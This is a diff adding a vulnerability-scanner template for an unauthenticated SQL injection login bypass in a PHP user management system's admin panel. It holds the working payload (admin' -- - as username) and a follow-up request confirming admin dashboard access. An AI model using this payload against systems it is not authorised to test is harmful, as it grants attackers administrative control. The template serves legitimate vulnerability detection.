@@ -1,0 +1,52 @@
+id: user-management-system-sqli
+info:
+  name: User Registration & Login and User Management System v3.0 - SQL Injection (Unauthenticated)
+  author: f0xy
+  severity: high
+  description: User Registration & Login and User Management System v3.0 admin panel has SQL vulnerability. Even though the person who discovered the vulnerability tested it in version 3.0, version 3.2 also contains the same vulnerability. It can be exploited by entering "*admin' -- -*" as the username parameter in the admin panel.
+  reference:
+    - https://www.exploit-db.com/exploits/51695
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |-
+        POST /loginsystem/admin HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate, br
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 47
+        Origin: http://192.168.1.100
+        Connection: close
+        Cookie: security_level=0; PHPSESSID=5b333bjmc0bs13llmvld55ipps
+        Upgrade-Insecure-Requests: 1
+        
+        username=admin%27+--+-&password=whatever&login=
+    host-redirects: true
+  - raw:
+      - |+
+        GET /loginsystem/admin/dashboard.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate, br
+        Connection: close
+        Cookie: security_level=0; PHPSESSID=5b333bjmc0bs13llmvld55ipps
+        Upgrade-Insecure-Requests: 1
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Admin Panel"
+
+      - type: status
+        status:
+          - 200
+        
+
